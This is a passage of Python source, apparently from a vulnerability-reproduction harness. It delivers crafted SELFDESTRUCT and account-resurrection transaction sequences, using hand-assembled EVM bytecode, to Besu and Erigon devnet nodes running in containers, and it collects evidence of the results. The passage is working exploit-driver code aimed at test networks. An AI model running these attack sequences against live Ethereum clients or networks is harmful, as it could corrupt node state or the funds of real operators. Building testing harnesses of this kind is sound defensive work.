                      "finalizedBlockHash": parent}, None],
                )
                return {
                    "version": version,
                    "forkchoiceUpdated": fcu,
                    "payload": payload,
                    "newPayload": new_payload,
                    "canonicalForkchoiceUpdated": updated,
                }
            except DriverNotImplemented as exc:
                errors.append(f"{fcu_v}: {exc}")
        fork_fields = {}
        if isinstance(chain_config, dict):
            fork_fields = {
                key: chain_config.get(key)
                for key in ("homesteadBlock", "byzantiumBlock", "shanghaiTime",
                            "cancunTime", "pragueTime", "amsterdamTime")
                if key in chain_config
            }
        latest_fields = {
            key: latest.get(key)
            for key in ("number", "timestamp", "withdrawalsRoot",
                        "parentBeaconBlockRoot", "requestsHash", "blockAccessListHash")
            if key in latest
        }
        raise AttackNotDelivered(
            "no supported Engine API version could include pending txs: "
            + " | ".join(errors)[-1200:]
            + f"; chain_config_forks={fork_fields}; latest_fields={latest_fields}"
        )

    def _emit_besu_json_import(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Execute the lifecycle transaction through Besu's JSON block importer.

        Current Besu no longer creates Clique blocks.  Its supported offline
        block-import command still constructs and executes signed transactions
        with the production protocol schedule.  The target container is a real
        Kurtosis service; the driver copies a two-block signed chain into it,
        imports it with Besu, then starts the same Besu database over HTTP for
        post-state inspection.
        """
        import json
        from pathlib import Path
        import re
        import subprocess
        import time

        if not target.container_id:
            raise DriverNotImplemented("Besu JSON import needs the target container id")
        stopped = subprocess.run(
            ["docker", "exec", target.container_id, "sh", "-c",
             "kill $(cat /tmp/besu.pid)"],
            capture_output=True, text=True, timeout=30,
        )
        # `pkill` may return 2 when the image has no matching procfs entry at
        # the exact instant of the call; the subsequent importer is the real
        # lock/stop oracle, so keep its stdout/stderr as evidence instead of
        # turning this cleanup race into a false no-delivery result.
        time.sleep(2)
        factory_init, _ = self._factory_init()
        sender = target.lifecycle_from or self._DEVNET_FROM
        key = target.lifecycle_private_key or self._DEVNET_KEY
        address_proc = subprocess.run(
            ["cast", "compute-address", sender, "--nonce", "0"],
            capture_output=True, text=True, timeout=20,
        )
        if address_proc.returncode != 0:
            raise DriverNotImplemented(f"cast compute-address failed: {address_proc.stderr[-400:]}")
        factory_match = re.search(r"0x[0-9a-fA-F]{40}", address_proc.stdout)
        if not factory_match:
            raise DriverNotImplemented(f"cast compute-address returned no address: {address_proc.stdout!r}")
        factory = factory_match.group(0)
        chain = {
            "blocks": [
                {"number": "0x1", "transactions": [{
                    "secretKey": key, "gasLimit": "0xC3500",
                    "gasPrice": "0x3B9ACA00", "data": "0x" + factory_init.hex(),
                    "value": "0x0",
                }]},
                {"number": "0x2", "transactions": [{
                    "secretKey": key, "gasLimit": "0xC3500",
                    "gasPrice": "0x3B9ACA00", "to": factory, "value": "0x7",
                }]},
            ]
        }
        evidence_dir = Path(target.evidence_dir) if target.evidence_dir else Path.cwd()
        chain_path = evidence_dir / "besu-lifecycle-chain.json"
        chain_path.write_text(json.dumps(chain, indent=2) + "\n", encoding="utf-8")
        cp = subprocess.run(
            ["docker", "cp", str(chain_path), f"{target.container_id}:/attack.json"],
            capture_output=True, text=True, timeout=30,
        )
        if cp.returncode != 0:
            raise DriverNotImplemented(f"docker cp failed: {cp.stderr[-400:]}")
        imported = subprocess.run(
            ["docker", "exec", target.container_id, "besu",
             "--genesis-file=/genesis/genesis.json", "--data-path=/opt/besu/data",
             "blocks", "import", "--format=JSON", "--from=/attack.json"],
            capture_output=True, text=True, timeout=180,
        )
        (evidence_dir / "besu-import.stdout.txt").write_text(imported.stdout, encoding="utf-8")
        (evidence_dir / "besu-import.stderr.txt").write_text(imported.stderr, encoding="utf-8")
        if imported.returncode != 0:
            raise AttackNotDelivered(
                "Besu JSON block import failed: "
                + (imported.stdout + "\n" + imported.stderr)[-2000:]
            )
        start = subprocess.run(
            ["docker", "exec", "-d", target.container_id, "besu",
             "--genesis-file=/genesis/genesis.json", "--data-path=/opt/besu/data",
             "--rpc-http-enabled", "--rpc-http-host=0.0.0.0", "--rpc-http-port=8545",
             "--rpc-http-api=ETH,NET,WEB3,DEBUG,TXPOOL,ADMIN",
             "--host-allowlist=*", "--p2p-enabled=false"],
            capture_output=True, text=True, timeout=30,
        )
        if start.returncode != 0:
            raise AttackNotDelivered(f"Besu post-import start failed: {start.stderr[-500:]}")
        deadline = time.time() + 90
        while time.time() < deadline:
            try:
                latest = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["latest", True])
                if isinstance(latest, dict) and int(latest.get("number", "0x0"), 16) >= 2:
                    break
            except DriverNotImplemented:
                pass
            time.sleep(1)
        child_proc = subprocess.run(
            ["cast", "compute-address", factory, "--nonce", "0"],
            capture_output=True, text=True, timeout=20,
        )
        child_match = re.search(r"0x[0-9a-fA-F]{40}", child_proc.stdout)
        child = child_match.group(0) if child_proc.returncode == 0 and child_match else ""
        latest = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["latest", True])
        attack_tx = None
        if isinstance(latest, dict):
            txs = latest.get("transactions") or []
            attack_tx = txs[-1] if txs else None
        attack_hash = attack_tx.get("hash") if isinstance(attack_tx, dict) else None
        receipt = self._receipt(target.rpc_url, attack_hash) if attack_hash else {}
        self.last_evidence = {
            "delivery": "Besu blocks import --format=JSON",
            "import_returncode": imported.returncode,
            "import_output_tail": (imported.stdout + "\n" + imported.stderr)[-2000:],
            "factory_address": factory,
            "attack_transaction": receipt,
            "child_address": child,
            "child_code_after": self._rpc(target.rpc_url, "eth_getCode", [child, "latest"]) if child else None,
            "child_balance_after": self._rpc(target.rpc_url, "eth_getBalance", [child, "latest"]) if child else None,
            "beneficiary_balance": self._rpc(
                target.rpc_url, "eth_getBalance", [self._DEVNET_BENEFICIARY, "latest"]
            ),
            "latest_block": latest,
        }
        return 1 if receipt.get("status") in ("0x1", "0x01") else 0

    @classmethod
    def _child_init(cls) -> bytes:
        """Init code for a child whose runtime SELFDESTRUCTs to the beneficiary."""
        beneficiary = bytes.fromhex(cls._DEVNET_BENEFICIARY.removeprefix("0x"))
        runtime = bytes([0x73]) + beneficiary + bytes([0xFF])
        # PUSH runtime length, PUSH runtime offset, PUSH 0, CODECOPY,
        # PUSH runtime length, PUSH 0, RETURN.
        prefix = bytes([0x60, len(runtime), 0x60, 0x0C, 0x60, 0x00, 0x39,
                        0x60, len(runtime), 0x60, 0x00, 0xF3])
        return prefix + runtime

    @classmethod
    def _factory_init(cls) -> tuple[bytes, int]:
        """Build a factory that destroys A and then CALLs A with 7 wei.

        The child init code is embedded in the factory runtime, so the live
        transaction can be sent with empty calldata.  The two CALLs are in
        one EVM transaction: the first triggers SELFDESTRUCT, the second is
        the post-destruction value transfer.
        """
        child = cls._child_init()
        # Runtime prefix length is 42 bytes; child starts at 0x2a.
        runtime_prefix = bytes([
            0x60, len(child), 0x60, 0x2A, 0x60, 0x00, 0x39,
            # CREATE(value=0, offset=0, size=len(child)); stack order is
            # size, offset, value before CREATE.
            0x60, len(child), 0x60, 0x00, 0x60, 0x00, 0xF0,
            # Preserve A at the bottom; CALL stack is
            # [out_size, out_offset, in_size, in_offset, value, to, gas].
            # DUP6 recovers A after the five argument pushes.
            0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00,
            0x60, 0x00, 0x85, 0x5A, 0xF1, 0x50,
            # CALL(A, value=7, empty calldata).
            0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00,
            0x60, 0x07, 0x85, 0x5A, 0xF1, 0x00,
        ])
        if len(runtime_prefix) != 42:
            raise AssertionError(f"factory runtime offset changed: {len(runtime_prefix)}")
        runtime = runtime_prefix + child
        # Deployment init code copies the runtime from offset 0x0c.
        init_prefix = bytes([0x60, len(runtime), 0x60, 0x0C, 0x60, 0x00,
                             0x39, 0x60, len(runtime), 0x60, 0x00, 0xF3])
        return init_prefix + runtime, len(runtime)

    def _emit_besu_same_tx_refund(self, spec: FindingSpec, target: DriverTarget) -> int:
        if not target.rpc_url:
            raise DriverNotImplemented("Besu lifecycle probe needs an HTTP JSON-RPC endpoint")
        factory_init, _ = self._factory_init()
        factory_tx = self._cast_send(target, ["--create", "0x" + factory_init.hex()])
        mined_factory = self._force_include_pending(target)
        factory_receipt = self._receipt(target.rpc_url, factory_tx)
        factory = factory_receipt.get("contractAddress")
        if not factory or factory == "0x" + "0" * 40:
            raise DriverNotImplemented(f"factory deployment failed: {factory_receipt}")
        attack_tx = self._cast_send(target, [factory, "--value", "7wei"])
        mined_attack = self._force_include_pending(target)
        attack_receipt = self._receipt(target.rpc_url, attack_tx)
        self.last_evidence = {
            "sequence": "CREATE A; CALL(A,0) -> SELFDESTRUCT; CALL(A,7 wei)",
            "factory_deploy": factory_receipt,
            "attack_transaction": attack_receipt,
            "engine_mine_factory": mined_factory,
            "engine_mine_attack": mined_attack,
            "factory_address": factory,
            "beneficiary_balance": self._rpc(
                target.rpc_url, "eth_getBalance", [self._DEVNET_BENEFICIARY, "latest"]
            ),
        }
        return 1 if attack_receipt.get("status") in ("0x1", "0x01") else 0

    def _emit_erigon_precancun_resurrection(self, spec: FindingSpec, target: DriverTarget) -> int:
        if not target.rpc_url:
            raise DriverNotImplemented("Erigon lifecycle probe needs an HTTP JSON-RPC endpoint")
        latest = self._rpc(target.rpc_url, "eth_getBlockByNumber", ["latest", False])
        if target.lifecycle_mode == "erigon-precancun":
            # v2.41's legacy dev miner is the historical-fork target.  It
            # mines pending RPC transactions directly, so Engine API FCU is
            # intentionally not used here; the driver sends the two attack
            # transactions back-to-back and checks their receipts' block hash.
            import time

            child_tx = self._cast_send(target, ["--create", "0x" + self._child_init().hex()])
            child_receipt = self._receipt(target.rpc_url, child_tx)
            address = child_receipt.get("contractAddress")
            if not address:
                raise DriverNotImplemented(f"destroy target deployment failed: {child_receipt}")
            sender = target.lifecycle_from or self._DEVNET_FROM
            nonce = int(self._rpc(target.rpc_url, "eth_getTransactionCount",
                                  [sender, "pending"]), 16)
            destroy_tx = self._cast_send(target, [address, "--nonce", str(nonce)])
            fund_tx = self._cast_send(target, [address, "--nonce", str(nonce + 1),
                                               "--value", "7wei"])
            # Give the legacy five-second miner enough time to include both,
            # then fetch receipts without forcing a modern Engine payload.
            time.sleep(6)
            destroy_receipt = self._receipt(target.rpc_url, destroy_tx)
            fund_receipt = self._receipt(target.rpc_url, fund_tx)
            same_block = destroy_receipt.get("blockHash") == fund_receipt.get("blockHash")
            self.last_evidence = {
                "sequence": "pre-EIP-6780 tx1 SELFDESTRUCT(existing A); tx2 transfer 7 wei to A",
                "target_fork": "Erigon v2.41.0 chain=dev legacy Clique (no Shanghai/EIP-6780)",
                "destroy_target": address,
                "destroy_transaction": destroy_receipt,
                "fund_transaction": fund_receipt,
                "same_block": same_block,
                "account_code_after": self._rpc(target.rpc_url, "eth_getCode", [address, "latest"]),
                "account_balance_after": self._rpc(target.rpc_url, "eth_getBalance", [address, "latest"]),
            }
            return 2 if same_block and destroy_receipt.get("status") in ("0x1", "0x01") and fund_receipt.get("status") in ("0x1", "0x01") else 0
        if target.lifecycle_private_key:
            # The dedicated Kurtosis package is Erigon's current embedded
            # `--chain=dev` mode.  It hard-codes the modern fork schedule and
            # rejects external Engine API FCU calls while Caplin is enabled;
            # it cannot be turned into the pre-EIP-6780 chain required here.
            self.last_evidence = {
                "status": "not-applicable",
                "reason": "Erigon embedded dev chain is post-Cancun and its internal Caplin owns Engine API forkchoice",
                "latest_fields": {
                    key: latest.get(key)
                    for key in ("number", "timestamp", "withdrawalsRoot",
                                "parentBeaconBlockRoot", "requestsHash")
                    if key in latest
                },
                "attack_delivery": "not-attempted: historical fork unavailable",
            }
            return 0
        config = None
        for method in ("eth_chainConfig", "debug_chainConfig"):
            try:
                config = self._rpc(target.rpc_url, method)
                break
            except DriverNotImplemented:
                continue
        latest_ts = int(latest.get("timestamp", "0x0"), 16)
        cancun = config.get("cancunTime") if isinstance(config, dict) else None
        if cancun is not None and int(cancun, 16) <= latest_ts:
            self.last_evidence = {
                "status": "not-applicable",
                "reason": "target is already post-Cancun; existing-account SELFDESTRUCT is not attacker-reachable",
                "latest_timestamp": latest_ts,
                "cancun_time": cancun,
            }
            return 0

        child_tx = self._cast_send(target, ["--create", "0x" + self._child_init().hex()])
        mined_child = self._force_include_pending(target)
        child_receipt = self._receipt(target.rpc_url, child_tx)
        address = child_receipt.get("contractAddress")
        if not address:
            raise DriverNotImplemented(f"destroy target deployment failed: {child_receipt}")
        sender = target.lifecycle_from or self._DEVNET_FROM
        nonce = int(self._rpc(target.rpc_url, "eth_getTransactionCount",
                              [sender, "pending"]), 16)
        destroy_tx = self._cast_send(target, [address, "--nonce", str(nonce)])
        fund_tx = self._cast_send(target, [address, "--nonce", str(nonce + 1),
                                          "--value", "7wei"])
        mined_attack = self._force_include_pending(target)
        destroy_receipt = self._receipt(target.rpc_url, destroy_tx)
        fund_receipt = self._receipt(target.rpc_url, fund_tx)
        same_block = destroy_receipt.get("blockHash") == fund_receipt.get("blockHash")
        self.last_evidence = {
            "sequence": "pre-Cancun tx1 SELFDESTRUCT(existing A); tx2 transfer 7 wei to A",
            "destroy_target": address,
            "destroy_transaction": destroy_receipt,
            "fund_transaction": fund_receipt,
            "engine_mine_child": mined_child,
            "engine_mine_attack": mined_attack,
            "same_block": same_block,
            "account_balance": self._rpc(target.rpc_url, "eth_getBalance", [address, "latest"]),
            "account_nonce": self._rpc(target.rpc_url, "eth_getTransactionCount", [address, "latest"]),
            "cancun_time": cancun,
        }
        return 2 if same_block and destroy_receipt.get("status") in ("0x1", "0x01") and fund_receipt.get("status") in ("0x1", "0x01") else 0


DRIVER_REGISTRY: dict[AttackSurface, type[_StubDriver]] = {
    d.surface: d
    for d in (
        RlpxDriver,
        WireDriver,
        GossipDriver,
        TxpoolDriver,
        EngineDriver,
        BlockImportDriver,
    )
}


def get_driver(surface: AttackSurface) -> _StubDriver:
    """Instantiate the driver registered for ``surface``."""
    try:
        return DRIVER_REGISTRY[surface]()
    except KeyError as e:
        raise KeyError(f"no driver registered for surface {surface}") from e
